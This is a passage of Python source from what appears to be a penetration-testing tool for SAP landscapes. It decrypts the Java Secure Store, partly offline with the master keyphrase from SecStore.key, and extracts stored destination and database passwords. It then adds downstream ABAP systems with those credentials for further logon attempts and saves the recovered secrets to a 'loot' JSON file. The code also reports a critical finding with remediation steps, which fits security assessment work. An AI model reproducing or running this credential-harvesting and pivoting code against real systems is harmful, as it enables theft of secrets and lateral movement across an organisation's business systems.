        # Dump the property map of up to 3 CIDs that look like HTTP
        # destinations (contain '#~Type' or an http(s):// value) so
        # the operator can see the exact key schema SAP uses on this
        # kernel — lets us extend the extractor on the next pass.
        http_candidate_cids = []
        for cid, props in raw_ctx.items():
            has_http_type = any(
                (v or "").strip().upper() == "HTTP"
                for k, v in props.items() if "type" in k.lower())
            has_http_value = any(
                (v or "").strip().lower().startswith(("http://", "https://"))
                for v in props.values())
            if has_http_type or has_http_value:
                http_candidate_cids.append(cid)
            if len(http_candidate_cids) >= 3:
                break
        for i, cid in enumerate(http_candidate_cids, 1):
            props = raw_ctx.get(cid, {})
            print(f"[*] {node.sid}:   HTTP-like CID #{i} cid={cid}:")
            for k in sorted(props.keys()):
                v = props[k] or ""
                # Truncate long values
                vshow = v if len(v) < 100 else v[:100] + "…"
                print(f"[*] {node.sid}:     {k} = {vshow}")

    # Mark file-entry rows with source="SecStore.properties" for symmetry
    for row in persisted:
        if "source" not in row:
            row["source"] = "SecStore.properties"
    node.java_secstore_entries = persisted
    result["entries_count"] = len(persisted)
    result["configentry_count"] = len(r.get("config_entries", []))
    if suppressed_factory_dups:
        print(f"[*] {node.sid}: suppressed {suppressed_factory_dups} "
              f"factory-default (#@) rows that duplicate an active "
              f"(#~) sibling under the same CID")

    # Surface rows whose VBYTES the engine-side SecStoreFS.decrypt()
    # refused.  Per ERPScan's 2018 research (docs/research/07_*), the
    # J2EE_CONFIGENTRY VBYTES are encrypted with the SAME master
    # keyphrase that lives in /usr/sap/<SID>/SYS/global/security/data/
    # SecStore.key.  We retry every refused row in pure Python via
    # sap_java_secstore_offline — handles both format-byte 0x00
    # (cleartext with an 18-byte header) and 0x01 (PBE) that the
    # engine API rejects inconsistently.
    failed = r.get("failed_decrypts", []) or []
    offline_decoded_cids = set()
    if failed:
        print(f"[!] {node.sid}: {len(failed)} J2EE_CONFIGENTRY rows were "
              f"refused by engine-side SecStoreFS.decrypt() — retrying "
              f"offline with the master keyphrase from SecStore.key …")
        off_r = offline_decrypt_secstore(node, failed)
        if off_r.get("error"):
            print(f"[!] {node.sid}: offline retry skipped: "
                  f"{off_r['error']}")
        for d in off_r.get("decoded", []):
            key = (d.get("cid", ""), d.get("name", ""))
            offline_decoded_cids.add(key)
            # Enrich with destination context if available so the row
            # shows up in the secstore modal under its real owner.
            ctx = cid_context.get(d.get("cid", ""), {})
            persisted.append({
                "name": d.get("name", ""),
                "kind": "configentry",
                "target_sid": ctx.get("dest_target_sid", ""),
                "client":     ctx.get("dest_client", ""),
                "is_downstream": bool(ctx.get("dest_target_sid")),
                "value": d.get("value", ""),
                "cid":   d.get("cid", ""),
                "source": "J2EE_CONFIGENTRY (offline)",
                "dest_name": ctx.get("dest_name", ""),
                "dest_user": ctx.get("dest_user", ""),
                "dest_host": ctx.get("dest_host", ""),
            })
            # Also re-run per-CID bucket so the auto-plot loop picks
            # up a password the offline pass recovered.  Admit host-only
            # buckets (UMEBackendConnection and similar system
            # destinations set #~jco.client.mshost but not r3name /
            # ashost — we resolve the SID via host-match later).
            cid = d.get("cid", "")
            nm = (d.get("name", "") or "").lower()
            if (cid and (ctx.get("dest_target_sid") or ctx.get("dest_host"))
                    and ("passw" in nm or "pwd" in nm)):
                b = cid_bucket.setdefault(cid, {
                    "target_sid": ctx.get("dest_target_sid", ""),
                    "client":     ctx.get("dest_client", ""),
                    "user":       ctx.get("dest_user", ""),
                    "host":       ctx.get("dest_host", ""),
                    "name":       ctx.get("dest_name", ""),
                    "password":   "",
                })
                if not b["password"]:
                    b["password"] = d.get("value", "")

        # Anything the offline pass couldn't recover stays in the
        # "undecryptable" synthetic-row list so the operator can
        # investigate manually.
        still_failed = off_r.get("still_failed", failed)
        if off_r.get("decoded"):
            print(f"[+] {node.sid}: {len(off_r['decoded'])} row(s) "
                  f"recovered offline, {len(still_failed)} still "
                  f"unreadable")
        else:
            print(f"[!] {node.sid}: {len(still_failed)} rows remain "
                  f"undecryptable — sample (first 20):")
            for fd in still_failed[:20]:
                print(f"[!] {node.sid}:   cid={fd.get('cid','?')} "
                      f"name={fd.get('name','?')} "
                      f"reason={fd.get('reason','?')}")
            if len(still_failed) > 20:
                print(f"[!] {node.sid}:   ... and "
                      f"{len(still_failed) - 20} more.")
        # Stash on node so the GUI can surface them too (future modal tab)
        node.java_secstore_failed_decrypts = still_failed[:500]
        # Synthetic row for each still-unrecoverable entry.
        for fd in still_failed:
            persisted.append({
                "name": fd.get("name", ""),
                "kind": "undecryptable",
                "target_sid": "",
                "client": "",
                "is_downstream": False,
                "value": f"<decrypt failed: {fd.get('reason','')}>",
                "cid": fd.get("cid", ""),
                "source": "J2EE_CONFIGENTRY",
                "dest_name": "",
                "dest_user": "",
                "dest_host": "",
            })

        # Final pass: drop any factory-default (#@<name>) row whose
        # active (#~<name>) sibling is in persisted under the same CID.
        # The earlier in-flight filter only applies to engine-decrypted
        # rows; rows that came back via the offline path bypass it and
        # caused visible duplicates in the modal (#@jco.client.passwd
        # + #~jco.client.passwd showing same value, same destination).
        active_seen = {}   # (cid, basename) -> True
        for row in persisted:
            nm = (row.get("name", "") or "")
            if nm.startswith("#~"):
                active_seen[(row.get("cid", ""), nm[2:])] = True
        if active_seen:
            before = len(persisted)
            persisted = [
                row for row in persisted
                if not ((row.get("name", "") or "").startswith("#@")
                          and (row.get("cid", ""),
                                (row.get("name", "") or "")[2:]) in active_seen)
            ]
            extra_dropped = before - len(persisted)
            if extra_dropped:
                print(f"[*] {node.sid}: final pass dropped "
                      f"{extra_dropped} more #@-sibling row(s) that "
                      f"slipped past the engine-side filter (offline-"
                      f"decrypted duplicates)")

        node.java_secstore_entries = persisted
        result["entries_count"] = len(persisted)
        # Second pass through the cid_bucket → downstream_plan promotion
        # for any newly-recovered passwords.  This is a minimal replay
        # of the earlier loop so the auto-plot step (below) sees the
        # freshly decrypted creds.  Same host-match fallback as the
        # first pass, to handle UMEBackendConnection-style destinations
        # that carry only mshost/ashost with no SID.
        for cid, b in cid_bucket.items():
            if not b["password"]:
                continue
            host = (b["host"] or "").strip()
            user = (b["user"] or "SAPJSF").strip()
            client = (b["client"] or "").strip()
            if not client.isdigit():
                client = ""
            target_sid = b["target_sid"]
            if not target_sid and host:
                match = _find_node_by_host_flex(state, host,
                                                    exclude_sid=node.sid)
                if match:
                    target_sid = match.sid
                    print(f"[*] {node.sid}: offline replay — "
                          f"{b['name'] or cid} has no r3name, resolved "
                          f"host {host} → existing node {target_sid}")
            # SAPControl probe fallback — same as the first pass.
            if not target_sid and host:
                target_sid = _probe_and_add_host(
                    state, host, node.saprouter,
                    ref=(b["name"] or cid),
                    exclude_sid=node.sid)
            if not target_sid:
                if host:
                    print(f"[*] {node.sid}: offline replay — "
                          f"{b['name'] or cid} password recovered "
                          f"({user}@{host}/{client or '?'}) — SAPControl "
                          f"probe on {host} failed, not auto-plotting")
                continue
            already_planned = any(
                (t == target_sid
                  and (len(p) >= 5 and p[4] == (b["name"] or f"CID_{cid}")))
                for p in downstream_plan
                for t in [p[0]]
            )
            if already_planned:
                continue
            downstream_plan.append((
                target_sid, client,
                "jco_dest_direct",
                "",
                b["name"] or f"CID_{cid}",
                {"user": user, "password": b["password"], "host": host,
                  "sysnr": b.get("sysnr", "")},
            ))

    # 4. Local DB creds → add to node's own credentials list (as DB flavor).
    if local_jdbc and local_jdbc.get("user") and local_jdbc.get("password"):
        # Use a synthetic "client" slot "db" to flag this as DB-tier
        # rather than SAP-app tier.  SAPNode.credentials is homogeneous,
        # so carrying a kind-marker inside Credentials isn't available —
        # we store it in the list and let downstream code decide.
        already = any(c.username == local_jdbc["user"]
                       and c.password == local_jdbc["password"]
                       for c in node.credentials)
        if not already:
            node.credentials.append(Credentials(
                username=local_jdbc["user"],
                password=local_jdbc["password"],
                client="DB", instance_nr=f"{java_inst:02d}",
                verified=False,
            ))
            result["credentials_added"] += 1
            print(f"[+] {node.sid}: imported local DB creds "
                  f"({local_jdbc.get('db_type','?')} {local_jdbc.get('user')})")

    # 5. Downstream ABAP nodes: auto-plot + credentials + RFC edge.
    for plan in downstream_plan:
        # Tuple is (tgt_sid, client, kind, value, entry_name) with an
        # optional 6th element (dict) carrying pre-extracted user /
        # password / host — used for jco_dest_direct so the password
        # isn't round-tripped through parse_jdbc_entry's &-terminator.
        if len(plan) == 6:
            tgt_sid, client, kind, value, entry_name, extras = plan
        else:
            tgt_sid, client, kind, value, entry_name = plan
            extras = None
        # The downstream value for a SAPJSF entry is usually the cleartext
        # password; jco_dest entries carry a JDBC-style string.  Normalise.
        if extras is not None:
            # Direct fields — used when the source already parsed them
            # (cid_bucket path).  Avoids the &-in-password truncation.
            tgt_user = extras.get("user") or "SAPJSF"
            tgt_pwd  = extras.get("password") or ""
            tgt_host = extras.get("host") or ""
            tgt_sysnr = extras.get("sysnr") or ""
        elif "=" in value and ("user=" in value.lower() or "password=" in value.lower()):
            jd = _ss.parse_jdbc_entry(value)
            tgt_user = jd.get("user") or "SAPJSF"
            tgt_pwd  = jd.get("password") or ""
            tgt_host = jd.get("host") or ""
            tgt_sysnr = (jd.get("sysnr") or "").strip()
        else:
            # Bare password string
            tgt_user = "SAPJSF"
            tgt_pwd  = value
            tgt_host = ""
            tgt_sysnr = ""
        if tgt_sysnr.isdigit():
            tgt_sysnr = tgt_sysnr.zfill(2)
        else:
            tgt_sysnr = ""

        if not tgt_pwd:
            continue

        # Auto-plot the downstream SID if missing (silent add, per user policy)
        down = state.get_node(tgt_sid)
        if down is None:
            # Seed the new node with the JCo-destination sysnr so every
            # downstream probe (credential logon, port calc, etc.) uses
            # the right gateway port — not the default 00.
            seed_instances = ([InstanceInfo(instance_nr=tgt_sysnr,
                                              ip=tgt_host or "")]
                                if tgt_sysnr else [])
            down = SAPNode(sid=tgt_sid, system_type="ABAP",
                            hostname=tgt_host, ip=tgt_host or "",
                            instances=seed_instances,
                            saprouter=node.saprouter)
            state.add_node(down)
            result["downstream_added"] += 1
            print(f"[+] {node.sid}: auto-plotted downstream ABAP system "
                  f"{tgt_sid}{' @ '+tgt_host if tgt_host else ''}"
                  f"{' sysnr='+tgt_sysnr if tgt_sysnr else ''}")
        elif tgt_sysnr and tgt_sysnr not in down.instance_nrs():
            # Node exists (e.g. auto-plotted earlier from the same SecStore
            # without a sysnr, or from a SAPControl probe that defaulted
            # to 00).  Register the real sysnr so the direct test uses it.
            down.instances.append(InstanceInfo(
                instance_nr=tgt_sysnr, ip=tgt_host or ""))

        # Credentials — normalise client to 3-digit numeric.  Anything
        # else (empty, non-numeric, pre-padded wrongly) gets padded or
        # defaulted so the NW RFC SDK doesn't later reject the logon
        # with 'RFC_INVALID_PARAMETER: Invalid CLIENT format'.
        client_norm = (client or "").strip()
        if client_norm.isdigit():
            client_norm = client_norm.zfill(3)
        else:
            client_norm = "000"
        cred_inst = tgt_sysnr or "00"
        if not any(c.username.upper() == tgt_user.upper() and c.password == tgt_pwd
                    and c.client == client_norm
                    for c in down.credentials):
            down.credentials.append(Credentials(
                username=tgt_user, password=tgt_pwd,
                client=client_norm, instance_nr=cred_inst,
                verified=False,
            ))
            result["credentials_added"] += 1
            print(f"[+] {node.sid}: imported {tgt_user}@{tgt_sid}"
                  f" client {client_norm} credential")

        # RFC-style edge source → target.  Re-use the same 3-digit
        # normaliser so the RFC-destination logon test never gets an
        # empty / non-numeric client.
        edge_client = (client or "").strip()
        if edge_client.isdigit():
            edge_client = edge_client.zfill(3)
        else:
            edge_client = "000"
        # Use the entry name verbatim — it already matches the NWA
        # destination name (for JCo dests: the #~destination.name VSTR;
        # for true SAPJSF/<SID>/<client> entries: the raw CID).  The
        # previous "SAPJSF_" prefix caused labels like
        # "SAPJSF_SJ1_TO_SB6" to diverge from NWA's "SJ1_TO_SB6".
        edge_dest = entry_name
        existing = [c for c in state.connections
                     if c.source_sid == node.sid
                        and c.target_sid == tgt_sid
                        and c.destination_name == edge_dest]
        if not existing:
            state.add_connection(RFCConnection(
                source_sid=node.sid, source_host=node.hostname or node.ip,
                target_sid=tgt_sid, target_host=tgt_host,
                target_ip=tgt_host if tgt_host.count(".") == 3 else "",
                target_instance_nr=tgt_sysnr,
                destination_name=edge_dest,
                rfc_user=tgt_user, client=edge_client,
                secstore_password=tgt_pwd,
                tested=False, logon_tested=False,
            ))
            result["edges_added"] += 1
            print(f"[+] {node.sid}: added RFC edge → {tgt_sid} "
                  f"(via {entry_name}, client={edge_client}"
                  f"{', sysnr='+tgt_sysnr if tgt_sysnr else ''})")

    # 6. Finding on the source node.
    crit_names = [row["name"] for row in persisted
                   if row["kind"] in ("jdbc_local", "sapjsf", "jco_dest")]
    downstream_sids = sorted(set(row["target_sid"] for row in persisted
                                   if row["is_downstream"]))
    if persisted:
        f = Finding(
            name="Java Secure Store decrypted",
            severity=Severity.CRITICAL,
            description=(
                f"SecStoreFS read-and-decrypt succeeded — "
                f"{len(persisted)} entries recovered "
                f"(version={r['version']}, algorithm tag='{r['algorithm'][:60]}').  "
                + (f"Downstream ABAP systems exposed: "
                   f"{', '.join(downstream_sids)}.  " if downstream_sids else "")
                + "Local DB credentials "
                + ("extracted" if local_jdbc and local_jdbc.get("password")
                    else "not present") + "."
            ),
            remediation=(
                "Rotate the Java master keyphrase (ConfigTool → "
                "Cluster-data → Secure Storage → Change Key).  "
                "Restrict OS-level read access to "
                "/usr/sap/<SID>/SYS/global/security/data/.  "
                "Apply SAP Note 3153525 (AES-256 algorithm for "
                "SecureStoreFS) if available for the kernel version.  "
                "Rotate every SAPJSF / JCo destination password exposed "
                "by this finding."
            ),
            detail=f"Entries: {', '.join(crit_names[:20])}" +
                    ("..." if len(crit_names) > 20 else ""),
        )
        # De-duplicate on name
        if not any(x.name == f.name for x in node.findings):
            node.findings.append(f)
            node.has_critical_finding = True

    # 7. Persist decrypted entries to disk so the user has loot they can
    #    re-open later (the in-memory copy on node.java_secstore_entries
    #    is gone after a process restart).
    try:
        import sapmap_state as _ss_state
        import json as _json
        import os as _os_save
        loot_dir = _ss_state.ensure_loot_dir("secstore")
        ts = _dt.now().strftime("%Y%m%d_%H%M%S")
        outfile = _os_save.path.join(loot_dir,
                                     f"java_secstore_{node.sid}_{ts}.json")
        payload = {
            "sid": node.sid,
            "host": node.ip or node.hostname,
            "version": r.get("version", ""),
            "algorithm": r.get("algorithm", ""),
            "entries_count": len(persisted),
            "downstream_sids": downstream_sids,
            "entries": persisted,
        }
        with open(outfile, "w", encoding="utf-8") as _fh:
            _json.dump(payload, _fh, indent=2, default=str)
        print(f"[+] {node.sid}: Java Secure Store loot written to {outfile} "
              f"({len(persisted)} entries)")
        result["loot_file"] = outfile
    except Exception as _save_e:
        print(f"[-] {node.sid}: failed to write Java SecStore loot: {_save_e}")

    result["success"] = True
    result["version"] = r["version"]
    result["algorithm"] = r["algorithm"]
    return result
